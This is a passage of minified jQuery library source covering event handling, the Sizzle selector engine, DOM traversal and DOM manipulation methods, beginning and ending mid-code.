a},guid:1E8,proxy:c.proxy,special:{ready:{setup:c.bindReady,teardown:c.noop},live:{add:function(a){c.event.add(this,a.origType,c.extend({},a,{handler:oa}))},remove:function(a){var b=true,d=a.origType.replace(O,"");c.each(c.data(this,"events").live||[],function(){if(d===this.origType.replace(O,""))return b=false});b&&c.event.remove(this,a.origType,oa)}},beforeunload:{setup:function(a,b,d){if(this.setInterval)this.onbeforeunload=d;return false},teardown:function(a,b){if(this.onbeforeunload===b)this.onbeforeunload=null}}}};var Ca=s.removeEventListener?function(a,b,d){a.removeEventListener(b,d,false)}:function(a,b,d){a.detachEvent("on"+b,d)};c.Event=function(a){if(!this.preventDefault)return new c.Event(a);if(a&&a.type){this.originalEvent=a;this.type=a.type}else this.type=a;this.timeStamp=J();this[G]=true};c.Event.prototype={preventDefault:function(){this.isDefaultPrevented=Z;var a=this.originalEvent;if(a){a.preventDefault&&a.preventDefault();a.returnValue=false}},stopPropagation:function(){this.isPropagationStopped=Z;var a=this.originalEvent;if(a){a.stopPropagation&&a.stopPropagation();a.cancelBubble=true}},stopImmediatePropagation:function(){this.isImmediatePropagationStopped=Z;this.stopPropagation()},isDefaultPrevented:Y,isPropagationStopped:Y,isImmediatePropagationStopped:Y};var Da=function(a){var b=a.relatedTarget;try{for(;b&&b!==this;)b=b.parentNode;if(b!==this){a.type=a.data;c.event.handle.apply(this,arguments)}}catch(d){}},Ea=function(a){a.type=a.data;c.event.handle.apply(this,arguments)};c.each({mouseenter:"mouseover",mouseleave:"mouseout"},function(a,b){c.event.special[a]={setup:function(d){c.event.add(this,b,d&&d.selector?Ea:Da,a)},teardown:function(d){c.event.remove(this,b,d&&d.selector?Ea:Da)}}});if(!c.support.submitBubbles)c.event.special.submit={setup:function(){if(this.nodeName.toLowerCase()!=="form"){c.event.add(this,"click.specialSubmit",function(a){var b=a.target,d=b.type;if((d==="submit"||d==="image")&&c(b).closest("form").length)return na("submit",this,arguments)});c.event.add(this,"keypress.specialSubmit",function(a){var b=a.target,d=b.type;if((d==="text"||d==="password")&&c(b).closest("form").length&&a.keyCode===13)return na("submit",this,arguments)})}else return false},teardown:function(){c.event.remove(this,".specialSubmit")}};if(!c.support.changeBubbles){var da=/textarea|input|select/i,ea,Fa=function(a){var b=a.type,d=a.value;if(b==="radio"||b==="checkbox")d=a.checked;else if(b==="select-multiple")d=a.selectedIndex>-1?c.map(a.options,function(f){return f.selected}).join("-"):"";else if(a.nodeName.toLowerCase()==="select")d=a.selectedIndex;return d},fa=function(a,b){var d=a.target,f,e;if(!(!da.test(d.nodeName)||d.readOnly)){f=c.data(d,"_change_data");e=Fa(d);if(a.type!=="focusout"||d.type!=="radio")c.data(d,"_change_data",e);if(!(f===w||e===f))if(f!=null||e){a.type="change";return c.event.trigger(a,b,d)}}};c.event.special.change={filters:{focusout:fa,click:function(a){var b=a.target,d=b.type;if(d==="radio"||d==="checkbox"||b.nodeName.toLowerCase()==="select")return fa.call(this,a)},keydown:function(a){var b=a.target,d=b.type;if(a.keyCode===13&&b.nodeName.toLowerCase()!=="textarea"||a.keyCode===32&&(d==="checkbox"||d==="radio")||d==="select-multiple")return fa.call(this,a)},beforeactivate:function(a){a=a.target;c.data(a,"_change_data",Fa(a))}},setup:function(){if(this.type==="file")return false;for(var a in ea)c.event.add(this,a+".specialChange",ea[a]);return da.test(this.nodeName)},teardown:function(){c.event.remove(this,".specialChange");return da.test(this.nodeName)}};ea=c.event.special.change.filters}s.addEventListener&&c.each({focus:"focusin",blur:"focusout"},function(a,b){function d(f){f=c.event.fix(f);f.type=b;return c.event.handle.call(this,f)}c.event.special[b]={setup:function(){this.addEventListener(a,d,true)},teardown:function(){this.removeEventListener(a,d,true)}}});c.each(["bind","one"],function(a,b){c.fn[b]=function(d,f,e){if(typeof d==="object"){for(var j in d)this[b](j,f,d[j],e);return this}if(c.isFunction(f)){e=f;f=w}var i=b==="one"?c.proxy(e,function(k){c(this).unbind(k,i);return e.apply(this,arguments)}):e;if(d==="unload"&&b!=="one")this.one(d,f,e);else{j=0;for(var o=this.length;j<o;j++)c.event.add(this[j],d,i,f)}return this}});c.fn.extend({unbind:function(a,b){if(typeof a==="object"&&!a.preventDefault)for(var d in a)this.unbind(d,a[d]);else{d=0;for(var f=this.length;d<f;d++)c.event.remove(this[d],a,b)}return this},delegate:function(a,b,d,f){return this.live(b,d,f,a)},undelegate:function(a,b,d){return arguments.length===0?this.unbind("live"):this.die(b,null,d,a)},trigger:function(a,b){return this.each(function(){c.event.trigger(a,b,this)})},triggerHandler:function(a,b){if(this[0]){a=c.Event(a);a.preventDefault();a.stopPropagation();c.event.trigger(a,b,this[0]);return a.result}},toggle:function(a){for(var b=arguments,d=1;d<b.length;)c.proxy(a,b[d++]);return this.click(c.proxy(a,function(f){var e=(c.data(this,"lastToggle"+a.guid)||0)%d;c.data(this,"lastToggle"+a.guid,e+1);f.preventDefault();return b[e].apply(this,arguments)||false}))},hover:function(a,b){return this.mouseenter(a).mouseleave(b||a)}});var Ga={focus:"focusin",blur:"focusout",mouseenter:"mouseover",mouseleave:"mouseout"};c.each(["live","die"],function(a,b){c.fn[b]=function(d,f,e,j){var i,o=0,k,n,r=j||this.selector,u=j?this:c(this.context);if(c.isFunction(f)){e=f;f=w}for(d=(d||"").split(" ");(i=d[o++])!=null;){j=O.exec(i);k="";if(j){k=j[0];i=i.replace(O,"")}if(i==="hover")d.push("mouseenter"+k,"mouseleave"+k);else{n=i;if(i==="focus"||i==="blur"){d.push(Ga[i]+k);i+=k}else i=(Ga[i]||i)+k;b==="live"?u.each(function(){c.event.add(this,pa(i,r),{data:f,selector:r,handler:e,origType:i,origHandler:e,preType:n})}):u.unbind(pa(i,r),e)}}return this}});c.each("blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error".split(" "),function(a,b){c.fn[b]=function(d){return d?this.bind(b,d):this.trigger(b)};if(c.attrFn)c.attrFn[b]=true});A.attachEvent&&!A.addEventListener&&A.attachEvent("onunload",function(){for(var a in c.cache)if(c.cache[a].handle)try{c.event.remove(c.cache[a].handle.elem)}catch(b){}});(function(){function a(g){for(var h="",l,m=0;g[m];m++){l=g[m];if(l.nodeType===3||l.nodeType===4)h+=l.nodeValue;else if(l.nodeType!==8)h+=a(l.childNodes)}return h}function b(g,h,l,m,q,p){q=0;for(var v=m.length;q<v;q++){var t=m[q];if(t){t=t[g];for(var y=false;t;){if(t.sizcache===l){y=m[t.sizset];break}if(t.nodeType===1&&!p){t.sizcache=l;t.sizset=q}if(t.nodeName.toLowerCase()===h){y=t;break}t=t[g]}m[q]=y}}}function d(g,h,l,m,q,p){q=0;for(var v=m.length;q<v;q++){var t=m[q];if(t){t=t[g];for(var y=false;t;){if(t.sizcache===l){y=m[t.sizset];break}if(t.nodeType===1){if(!p){t.sizcache=l;t.sizset=q}if(typeof h!=="string"){if(t===h){y=true;break}}else if(k.filter(h,[t]).length>0){y=t;break}}t=t[g]}m[q]=y}}}var f=/((?:\((?:\([^()]+\)|[^()]+)+\)|\[(?:\[[^[\]]*\]|['"][^'"]*['"]|[^[\]'"]+)+\]|\\.|[^ >+~,(\[\\]+)+|[>+~])(\s*,\s*)?((?:.|\r|\n)*)/g,e=0,j=Object.prototype.toString,i=false,o=true;[0,0].sort(function(){o=false;return 0});var k=function(g,h,l,m){l=l||[];var q=h=h||s;if(h.nodeType!==1&&h.nodeType!==9)return[];if(!g||typeof g!=="string")return l;for(var p=[],v,t,y,S,H=true,M=x(h),I=g;(f.exec(""),v=f.exec(I))!==null;){I=v[3];p.push(v[1]);if(v[2]){S=v[3];break}}if(p.length>1&&r.exec(g))if(p.length===2&&n.relative[p[0]])t=ga(p[0]+p[1],h);else for(t=n.relative[p[0]]?[h]:k(p.shift(),h);p.length;){g=p.shift();if(n.relative[g])g+=p.shift();t=ga(g,t)}else{if(!m&&p.length>1&&h.nodeType===9&&!M&&n.match.ID.test(p[0])&&!n.match.ID.test(p[p.length-1])){v=k.find(p.shift(),h,M);h=v.expr?k.filter(v.expr,v.set)[0]:v.set[0]}if(h){v=m?{expr:p.pop(),set:z(m)}:k.find(p.pop(),p.length===1&&(p[0]==="~"||p[0]==="+")&&h.parentNode?h.parentNode:h,M);t=v.expr?k.filter(v.expr,v.set):v.set;if(p.length>0)y=z(t);else H=false;for(;p.length;){var D=p.pop();v=D;if(n.relative[D])v=p.pop();else D="";if(v==null)v=h;n.relative[D](y,v,M)}}else y=[]}y||(y=t);y||k.error(D||g);if(j.call(y)==="[object Array]")if(H)if(h&&h.nodeType===1)for(g=0;y[g]!=null;g++){if(y[g]&&(y[g]===true||y[g].nodeType===1&&E(h,y[g])))l.push(t[g])}else for(g=0;y[g]!=null;g++)y[g]&&y[g].nodeType===1&&l.push(t[g]);else l.push.apply(l,y);else z(y,l);if(S){k(S,q,l,m);k.uniqueSort(l)}return l};k.uniqueSort=function(g){if(B){i=o;g.sort(B);if(i)for(var h=1;h<g.length;h++)g[h]===g[h-1]&&g.splice(h--,1)}return g};k.matches=function(g,h){return k(g,null,null,h)};k.find=function(g,h,l){var m,q;if(!g)return[];for(var p=0,v=n.order.length;p<v;p++){var t=n.order[p];if(q=n.leftMatch[t].exec(g)){var y=q[1];q.splice(1,1);if(y.substr(y.length-1)!=="\\"){q[1]=(q[1]||"").replace(/\\/g,"");m=n.find[t](q,h,l);if(m!=null){g=g.replace(n.match[t],"");break}}}}m||(m=h.getElementsByTagName("*"));return{set:m,expr:g}};k.filter=function(g,h,l,m){for(var q=g,p=[],v=h,t,y,S=h&&h[0]&&x(h[0]);g&&h.length;){for(var H in n.filter)if((t=n.leftMatch[H].exec(g))!=null&&t[2]){var M=n.filter[H],I,D;D=t[1];y=false;t.splice(1,1);if(D.substr(D.length-
1)!=="\\"){if(v===p)p=[];if(n.preFilter[H])if(t=n.preFilter[H](t,v,l,p,m,S)){if(t===true)continue}else y=I=true;if(t)for(var U=0;(D=v[U])!=null;U++)if(D){I=M(D,t,U,v);var Ha=m^!!I;if(l&&I!=null)if(Ha)y=true;else v[U]=false;else if(Ha){p.push(D);y=true}}if(I!==w){l||(v=p);g=g.replace(n.match[H],"");if(!y)return[];break}}}if(g===q)if(y==null)k.error(g);else break;q=g}return v};k.error=function(g){throw"Syntax error, unrecognized expression: "+g;};var n=k.selectors={order:["ID","NAME","TAG"],match:{ID:/#((?:[\w\u00c0-\uFFFF-]|\\.)+)/,CLASS:/\.((?:[\w\u00c0-\uFFFF-]|\\.)+)/,NAME:/\[name=['"]*((?:[\w\u00c0-\uFFFF-]|\\.)+)['"]*\]/,ATTR:/\[\s*((?:[\w\u00c0-\uFFFF-]|\\.)+)\s*(?:(\S?=)\s*(['"]*)(.*?)\3|)\s*\]/,TAG:/^((?:[\w\u00c0-\uFFFF\*-]|\\.)+)/,CHILD:/:(only|nth|last|first)-child(?:\((even|odd|[\dn+-]*)\))?/,POS:/:(nth|eq|gt|lt|first|last|even|odd)(?:\((\d*)\))?(?=[^-]|$)/,PSEUDO:/:((?:[\w\u00c0-\uFFFF-]|\\.)+)(?:\((['"]?)((?:\([^\)]+\)|[^\(\)]*)+)\2\))?/},leftMatch:{},attrMap:{"class":"className","for":"htmlFor"},attrHandle:{href:function(g){return g.getAttribute("href")}},relative:{"+":function(g,h){var l=typeof h==="string",m=l&&!/\W/.test(h);l=l&&!m;if(m)h=h.toLowerCase();m=0;for(var q=g.length,p;m<q;m++)if(p=g[m]){for(;(p=p.previousSibling)&&p.nodeType!==1;);g[m]=l||p&&p.nodeName.toLowerCase()===h?p||false:p===h}l&&k.filter(h,g,true)},">":function(g,h){var l=typeof h==="string";if(l&&!/\W/.test(h)){h=h.toLowerCase();for(var m=0,q=g.length;m<q;m++){var p=g[m];if(p){l=p.parentNode;g[m]=l.nodeName.toLowerCase()===h?l:false}}}else{m=0;for(q=g.length;m<q;m++)if(p=g[m])g[m]=l?p.parentNode:p.parentNode===h;l&&k.filter(h,g,true)}},"":function(g,h,l){var m=e++,q=d;if(typeof h==="string"&&!/\W/.test(h)){var p=h=h.toLowerCase();q=b}q("parentNode",h,m,g,p,l)},"~":function(g,h,l){var m=e++,q=d;if(typeof h==="string"&&!/\W/.test(h)){var p=h=h.toLowerCase();q=b}q("previousSibling",h,m,g,p,l)}},find:{ID:function(g,h,l){if(typeof h.getElementById!=="undefined"&&!l)return(g=h.getElementById(g[1]))?[g]:[]},NAME:function(g,h){if(typeof h.getElementsByName!=="undefined"){var l=[];h=h.getElementsByName(g[1]);for(var m=0,q=h.length;m<q;m++)h[m].getAttribute("name")===g[1]&&l.push(h[m]);return l.length===0?null:l}},TAG:function(g,h){return h.getElementsByTagName(g[1])}},preFilter:{CLASS:function(g,h,l,m,q,p){g=" "+g[1].replace(/\\/g,"")+" ";if(p)return g;p=0;for(var v;(v=h[p])!=null;p++)if(v)if(q^(v.className&&(" "+v.className+" ").replace(/[\t\n]/g," ").indexOf(g)>=0))l||m.push(v);else if(l)h[p]=false;return false},ID:function(g){return g[1].replace(/\\/g,"")},TAG:function(g){return g[1].toLowerCase()},CHILD:function(g){if(g[1]==="nth"){var h=/(-?)(\d*)n((?:\+|-)?\d*)/.exec(g[2]==="even"&&"2n"||g[2]==="odd"&&"2n+1"||!/\D/.test(g[2])&&"0n+"+g[2]||g[2]);g[2]=h[1]+(h[2]||1)-0;g[3]=h[3]-0}g[0]=e++;return g},ATTR:function(g,h,l,m,q,p){h=g[1].replace(/\\/g,"");if(!p&&n.attrMap[h])g[1]=n.attrMap[h];if(g[2]==="~=")g[4]=" "+g[4]+" ";return g},PSEUDO:function(g,h,l,m,q){if(g[1]==="not")if((f.exec(g[3])||"").length>1||/^\w/.test(g[3]))g[3]=k(g[3],null,null,h);else{g=k.filter(g[3],h,l,true^q);l||m.push.apply(m,g);return false}else if(n.match.POS.test(g[0])||n.match.CHILD.test(g[0]))return true;return g},POS:function(g){g.unshift(true);return g}},filters:{enabled:function(g){return g.disabled===false&&g.type!=="hidden"},disabled:function(g){return g.disabled===true},checked:function(g){return g.checked===true},selected:function(g){return g.selected===true},parent:function(g){return!!g.firstChild},empty:function(g){return!g.firstChild},has:function(g,h,l){return!!k(l[3],g).length},header:function(g){return/h\d/i.test(g.nodeName)},text:function(g){return"text"===g.type},radio:function(g){return"radio"===g.type},checkbox:function(g){return"checkbox"===g.type},file:function(g){return"file"===g.type},password:function(g){return"password"===g.type},submit:function(g){return"submit"===g.type},image:function(g){return"image"===g.type},reset:function(g){return"reset"===g.type},button:function(g){return"button"===g.type||g.nodeName.toLowerCase()==="button"},input:function(g){return/input|select|textarea|button/i.test(g.nodeName)}},setFilters:{first:function(g,h){return h===0},last:function(g,h,l,m){return h===m.length-1},even:function(g,h){return h%2===0},odd:function(g,h){return h%2===1},lt:function(g,h,l){return h<l[3]-0},gt:function(g,h,l){return h>l[3]-0},nth:function(g,h,l){return l[3]-0===h},eq:function(g,h,l){return l[3]-0===h}},filter:{PSEUDO:function(g,h,l,m){var q=h[1],p=n.filters[q];if(p)return p(g,l,h,m);else if(q==="contains")return(g.textContent||g.innerText||a([g])||"").indexOf(h[3])>=0;else if(q==="not"){h=h[3];l=0;for(m=h.length;l<m;l++)if(h[l]===g)return false;return true}else k.error("Syntax error, unrecognized expression: "+q)},CHILD:function(g,h){var l=h[1],m=g;switch(l){case"only":case"first":for(;m=m.previousSibling;)if(m.nodeType===1)return false;if(l==="first")return true;m=g;case"last":for(;m=m.nextSibling;)if(m.nodeType===1)return false;return true;case"nth":l=h[2];var q=h[3];if(l===1&&q===0)return true;h=h[0];var p=g.parentNode;if(p&&(p.sizcache!==h||!g.nodeIndex)){var v=0;for(m=p.firstChild;m;m=m.nextSibling)if(m.nodeType===1)m.nodeIndex=++v;p.sizcache=h}g=g.nodeIndex-q;return l===0?g===0:g%l===0&&g/l>=0}},ID:function(g,h){return g.nodeType===1&&g.getAttribute("id")===h},TAG:function(g,h){return h==="*"&&g.nodeType===1||g.nodeName.toLowerCase()===h},CLASS:function(g,h){return(" "+(g.className||g.getAttribute("class"))+" ").indexOf(h)>-1},ATTR:function(g,h){var l=h[1];g=n.attrHandle[l]?n.attrHandle[l](g):g[l]!=null?g[l]:g.getAttribute(l);l=g+"";var m=h[2];h=h[4];return g==null?m==="!=":m==="="?l===h:m==="*="?l.indexOf(h)>=0:m==="~="?(" "+l+" ").indexOf(h)>=0:!h?l&&g!==false:m==="!="?l!==h:m==="^="?l.indexOf(h)===0:m==="$="?l.substr(l.length-h.length)===h:m==="|="?l===h||l.substr(0,h.length+1)===h+"-":false},POS:function(g,h,l,m){var q=n.setFilters[h[2]];if(q)return q(g,l,h,m)}}},r=n.match.POS;for(var u in n.match){n.match[u]=new RegExp(n.match[u].source+/(?![^\[]*\])(?![^\(]*\))/.source);n.leftMatch[u]=new RegExp(/(^(?:.|\r|\n)*?)/.source+n.match[u].source.replace(/\\(\d+)/g,function(g,h){return"\\"+(h-0+1)}))}var z=function(g,h){g=Array.prototype.slice.call(g,0);if(h){h.push.apply(h,g);return h}return g};try{Array.prototype.slice.call(s.documentElement.childNodes,0)}catch(C){z=function(g,h){h=h||[];if(j.call(g)==="[object Array]")Array.prototype.push.apply(h,g);else if(typeof g.length==="number")for(var l=0,m=g.length;l<m;l++)h.push(g[l]);else for(l=0;g[l];l++)h.push(g[l]);return h}}var B;if(s.documentElement.compareDocumentPosition)B=function(g,h){if(!g.compareDocumentPosition||!h.compareDocumentPosition){if(g==h)i=true;return g.compareDocumentPosition?-1:1}g=g.compareDocumentPosition(h)&4?-1:g===h?0:1;if(g===0)i=true;return g};else if("sourceIndex"in s.documentElement)B=function(g,h){if(!g.sourceIndex||!h.sourceIndex){if(g==h)i=true;return g.sourceIndex?-1:1}g=g.sourceIndex-h.sourceIndex;if(g===0)i=true;return g};else if(s.createRange)B=function(g,h){if(!g.ownerDocument||!h.ownerDocument){if(g==h)i=true;return g.ownerDocument?-1:1}var l=g.ownerDocument.createRange(),m=h.ownerDocument.createRange();l.setStart(g,0);l.setEnd(g,0);m.setStart(h,0);m.setEnd(h,0);g=l.compareBoundaryPoints(Range.START_TO_END,m);if(g===0)i=true;return g};(function(){var g=s.createElement("div"),h="script"+(new Date).getTime();g.innerHTML="<a name='"+h+"'/>";var l=s.documentElement;l.insertBefore(g,l.firstChild);if(s.getElementById(h)){n.find.ID=function(m,q,p){if(typeof q.getElementById!=="undefined"&&!p)return(q=q.getElementById(m[1]))?q.id===m[1]||typeof q.getAttributeNode!=="undefined"&&q.getAttributeNode("id").nodeValue===m[1]?[q]:w:[]};n.filter.ID=function(m,q){var p=typeof m.getAttributeNode!=="undefined"&&m.getAttributeNode("id");return m.nodeType===1&&p&&p.nodeValue===q}}l.removeChild(g);l=g=null})();(function(){var g=s.createElement("div");g.appendChild(s.createComment(""));if(g.getElementsByTagName("*").length>0)n.find.TAG=function(h,l){l=l.getElementsByTagName(h[1]);if(h[1]==="*"){h=[];for(var m=0;l[m];m++)l[m].nodeType===1&&h.push(l[m]);l=h}return l};g.innerHTML="<a href='#'></a>";if(g.firstChild&&typeof g.firstChild.getAttribute!=="undefined"&&g.firstChild.getAttribute("href")!=="#")n.attrHandle.href=function(h){return h.getAttribute("href",2)};g=null})();s.querySelectorAll&&function(){var g=k,h=s.createElement("div");h.innerHTML="<p class='TEST'></p>";if(!(h.querySelectorAll&&h.querySelectorAll(".TEST").length===0)){k=function(m,q,p,v){q=q||s;if(!v&&q.nodeType===9&&!x(q))try{return z(q.querySelectorAll(m),p)}catch(t){}return g(m,q,p,v)};for(var l in g)k[l]=g[l];h=null}}();(function(){var g=s.createElement("div");g.innerHTML="<div class='test e'></div><div class='test'></div>";if(!(!g.getElementsByClassName||g.getElementsByClassName("e").length===0)){g.lastChild.className="e";if(g.getElementsByClassName("e").length!==1){n.order.splice(1,0,"CLASS");n.find.CLASS=function(h,l,m){if(typeof l.getElementsByClassName!=="undefined"&&!m)return l.getElementsByClassName(h[1])};g=null}}})();var E=s.compareDocumentPosition?function(g,h){return!!(g.compareDocumentPosition(h)&16)}:function(g,h){return g!==h&&(g.contains?g.contains(h):true)},x=function(g){return(g=(g?g.ownerDocument||g:0).documentElement)?g.nodeName!=="HTML":false},ga=function(g,h){var l=[],m="",q;for(h=h.nodeType?[h]:h;q=n.match.PSEUDO.exec(g);){m+=q[0];g=g.replace(n.match.PSEUDO,"")}g=n.relative[g]?g+"*":g;q=0;for(var p=h.length;q<p;q++)k(g,h[q],l);return k.filter(m,l)};c.find=k;c.expr=k.selectors;c.expr[":"]=c.expr.filters;c.unique=k.uniqueSort;c.text=a;c.isXMLDoc=x;c.contains=E})();var eb=/Until$/,fb=/^(?:parents|prevUntil|prevAll)/,gb=/,/;R=Array.prototype.slice;var Ia=function(a,b,d){if(c.isFunction(b))return c.grep(a,function(e,j){return!!b.call(e,j,e)===d});else if(b.nodeType)return c.grep(a,function(e){return e===b===d});else if(typeof b==="string"){var f=c.grep(a,function(e){return e.nodeType===1});if(Ua.test(b))return c.filter(b,f,!d);else b=c.filter(b,f)}return c.grep(a,function(e){return c.inArray(e,b)>=0===d})};c.fn.extend({find:function(a){for(var b=this.pushStack("","find",a),d=0,f=0,e=this.length;f<e;f++){d=b.length;c.find(a,this[f],b);if(f>0)for(var j=d;j<b.length;j++)for(var i=0;i<d;i++)if(b[i]===b[j]){b.splice(j--,1);break}}return b},has:function(a){var b=c(a);return this.filter(function(){for(var d=0,f=b.length;d<f;d++)if(c.contains(this,b[d]))return true})},not:function(a){return this.pushStack(Ia(this,a,false),"not",a)},filter:function(a){return this.pushStack(Ia(this,a,true),"filter",a)},is:function(a){return!!a&&c.filter(a,this).length>0},closest:function(a,b){if(c.isArray(a)){var d=[],f=this[0],e,j={},i;if(f&&a.length){e=0;for(var o=a.length;e<o;e++){i=a[e];j[i]||(j[i]=c.expr.match.POS.test(i)?c(i,b||this.context):i)}for(;f&&f.ownerDocument&&f!==b;){for(i in j){e=j[i];if(e.jquery?e.index(f)>-1:c(f).is(e)){d.push({selector:i,elem:f});delete j[i]}}f=f.parentNode}}return d}var k=c.expr.match.POS.test(a)?c(a,b||this.context):null;return this.map(function(n,r){for(;r&&r.ownerDocument&&r!==b;){if(k?k.index(r)>-1:c(r).is(a))return r;r=r.parentNode}return null})},index:function(a){if(!a||typeof a==="string")return c.inArray(this[0],a?c(a):this.parent().children());return c.inArray(a.jquery?a[0]:a,this)},add:function(a,b){a=typeof a==="string"?c(a,b||this.context):c.makeArray(a);b=c.merge(this.get(),a);return this.pushStack(qa(a[0])||qa(b[0])?b:c.unique(b))},andSelf:function(){return this.add(this.prevObject)}});c.each({parent:function(a){return(a=a.parentNode)&&a.nodeType!==11?a:null},parents:function(a){return c.dir(a,"parentNode")},parentsUntil:function(a,b,d){return c.dir(a,"parentNode",d)},next:function(a){return c.nth(a,2,"nextSibling")},prev:function(a){return c.nth(a,2,"previousSibling")},nextAll:function(a){return c.dir(a,"nextSibling")},prevAll:function(a){return c.dir(a,"previousSibling")},nextUntil:function(a,b,d){return c.dir(a,"nextSibling",d)},prevUntil:function(a,b,d){return c.dir(a,"previousSibling",d)},siblings:function(a){return c.sibling(a.parentNode.firstChild,a)},children:function(a){return c.sibling(a.firstChild)},contents:function(a){return c.nodeName(a,"iframe")?a.contentDocument||a.contentWindow.document:c.makeArray(a.childNodes)}},function(a,b){c.fn[a]=function(d,f){var e=c.map(this,b,d);eb.test(a)||(f=d);if(f&&typeof f==="string")e=c.filter(f,e);e=this.length>1?c.unique(e):e;if((this.length>1||gb.test(f))&&fb.test(a))e=e.reverse();return this.pushStack(e,a,R.call(arguments).join(","))}});c.extend({filter:function(a,b,d){if(d)a=":not("+a+")";return c.find.matches(a,b)},dir:function(a,b,d){var f=[];for(a=a[b];a&&a.nodeType!==9&&(d===w||a.nodeType!==1||!c(a).is(d));){a.nodeType===1&&f.push(a);a=a[b]}return f},nth:function(a,b,d){b=b||1;for(var f=0;a;a=a[d])if(a.nodeType===1&&++f===b)break;return a},sibling:function(a,b){for(var d=[];a;a=a.nextSibling)a.nodeType===1&&a!==b&&d.push(a);return d}});var Ja=/ jQuery\d+="(?:\d+|null)"/g,V=/^\s+/,Ka=/(<([\w:]+)[^>]*?)\/>/g,hb=/^(?:area|br|col|embed|hr|img|input|link|meta|param)$/i,La=/<([\w:]+)/,ib=/<tbody/i,jb=/<|&#?\w+;/,ta=/<script|<object|<embed|<option|<style/i,ua=/checked\s*(?:[^=]|=\s*.checked.)/i,Ma=function(a,b,d){return hb.test(d)?a:b+"></"+d+">"},F={option:[1,"<select multiple='multiple'>","</select>"],legend:[1,"<fieldset>","</fieldset>"],thead:[1,"<table>","</table>"],tr:[2,"<table><tbody>","</tbody></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],col:[2,"<table><tbody></tbody><colgroup>","</colgroup></table>"],area:[1,"<map>","</map>"],_default:[0,"",""]};F.optgroup=F.option;F.tbody=F.tfoot=F.colgroup=F.caption=F.thead;F.th=F.td;if(!c.support.htmlSerialize)F._default=[1,"div<div>","</div>"];c.fn.extend({text:function(a){if(c.isFunction(a))return this.each(function(b){var d=c(this);d.text(a.call(this,b,d.text()))});if(typeof a!=="object"&&a!==w)return this.empty().append((this[0]&&this[0].ownerDocument||s).createTextNode(a));return c.text(this)},wrapAll:function(a){if(c.isFunction(a))return this.each(function(d){c(this).wrapAll(a.call(this,d))});if(this[0]){var b=c(a,this[0].ownerDocument).eq(0).clone(true);this[0].parentNode&&b.insertBefore(this[0]);b.map(function(){for(var d=this;d.firstChild&&d.firstChild.nodeType===1;)d=d.firstChild;return d}).append(this)}return this},wrapInner:function(a){if(c.isFunction(a))return this.each(function(b){c(this).wrapInner(a.call(this,b))});return this.each(function(){var b=c(this),d=b.contents();d.length?d.wrapAll(a):b.append(a)})},wrap:function(a){return this.each(function(){c(this).wrapAll(a)})},unwrap:function(){return this.parent().each(function(){c.nodeName(this,"body")||c(this).replaceWith(this.childNodes)}).end()},append:function(){return this.domManip(arguments,true,function(a){this.nodeType===1&&this.appendChild(a)})},prepend:function(){return this.domManip(arguments,true,function(a){this.nodeType===1&&this.insertBefore(a,this.firstChild)})},before:function(){if(this[0]&&this[0].parentNode)return this.domManip(arguments,false,function(b){this.parentNode.insertBefore(b,this)});else if(arguments.length){var a=c(arguments[0]);a.push.apply(a,this.toArray());return this.pushStack(a,"before",arguments)}},after:function(){if(this[0]&&this[0].parentNode)return this.domManip(arguments,false,function(b){this.parentNode.insertBefore(b,this.nextSibling)});else if(arguments.length){var a=this.pushStack(this,"after",arguments);a.push.apply(a,c(arguments[0]).toArray());return a}},remove:function(a,b){for(var d=0,f;(f=this[d])!=null;d++)if(!a||c.filter(a,[f]).length){if(!b&&f.nodeType===1){c.cleanData(f.getElementsByTagName("*"));c.cleanData([f])}f.parentNode&&f.parentNode.removeChild(f)}return this},empty:function(){for(var a=0,b;(b=this[a])!=null;a++)for(b.nodeType===1&&c.cleanData(b.getElementsByTagName("*"));b.firstChild;)b.removeChild(b.firstChild);return this},clone:function(a){var b=this.map(function(){if(!c.support.noCloneEvent&&!c.isXMLDoc(this)){var d=this.outerHTML,f=this.ownerDocument;if(!d){d=f.createElement("div");d.appendChild(this.cloneNode(true));d=d.innerHTML}return c.clean([d.replace(Ja,"").replace(/=([^="'>\s]+\/)>/g,'="$1">').replace(V,"")],f)[0]}else return this.cloneNode(true)});if(a===true){ra(this,b);ra(this.find("*"),b.find("*"))}return b},html:function(a){if(a===w)return this[0]&&this[0].nodeType===1?this[0].innerHTML.replace(Ja,""):null;else if(typeof a==="string"&&!ta.test(a)&&(c.support.leadingWhitespace||!V.test(a))&&!F[(La.exec(a)||["",""])[1].toLowerCase()]){a=a.replace(Ka,Ma);try{for(var b=0,d=this.length;b<d;b++)if(this[b].nodeType===1){c.cleanData(this[b].getElementsByTagName("*"));this[b].innerHTML=a}}catch(f){this.empty().append(a)}}else c.isFunction(a)?this.each(function(e){var j=c(this),i=j.html();j.empty().append(function(){return a.call(this,e,i)})}):this.empty().append(a);return this},replaceWith:function(a){if(this[0]&&this[0].parentNode){if(c.isFunction(a))return this.each(function(b){var d=c(this),f=d.html();d.replaceWith(a.call(this,b,f))});if(typeof a!=="string")a=c(a).detach();return this.each(function(){var b=this.nextSibling,d=this.parentNode;c(this).remove();b?c(b).before(a):c(d).append(a)})}else return this.pushStack(c(c.isFunction(a)?a():a),"replaceWith",a)},detach:function(a){return this.remove(a,true)},domManip:function(a,b,d){function f(u){return c.nodeName(u,"table")?u.getElementsByTagName("tbody")[0]||u.appendChild(u.ownerDocument.createElement("tbody")):u}var e,j,i=a[0],o=[],k;if(!c.support.checkClone&&arguments.length===3&&typeof i==="string"&&ua.test(i))return this.each(function(){c(this).domManip(a,b,d,true)});if(c.isFunction(i))return this.each(function(u){var z=c(this);a[0]=i.call(this,u,b?z.html():w);z.domManip(a,b,d)});if(this[0]){e=i&&i.parentNode;e=c.support.parentNode&&e&&e.nodeType===11&&e.childNodes.length===this.length?{fragment:e}:sa(a,this,o);k=e.fragment;if(j=k.childNodes.length===1?(k=k.firstChild):k.firstChild){b=b&&c.nodeName(j,"tr");for(var n=0,r=this.length;n<r;n++)d.call(b?f(this[n],j):this[n],n>0||e.cacheable||this.length>1?k.cloneNode(true):k)}o.length&&c.each(o,Qa)}return this}});c.fragments={};c.each({appendTo:"append",prependTo:"prepend",insertBefore:"before",insertAfter:"after",replaceAll:"replaceWith"},function(a,b){c.fn[a]=function(d){var f=[];d=c(d);var e=this.length===1&&this[0].parentNode;if(e&&e.nodeType===11&&e.childNodes.length===1&&d.length===1){d[b](this[0]);return this}else{e=0;for(var j=d.length;e<j;e++){var 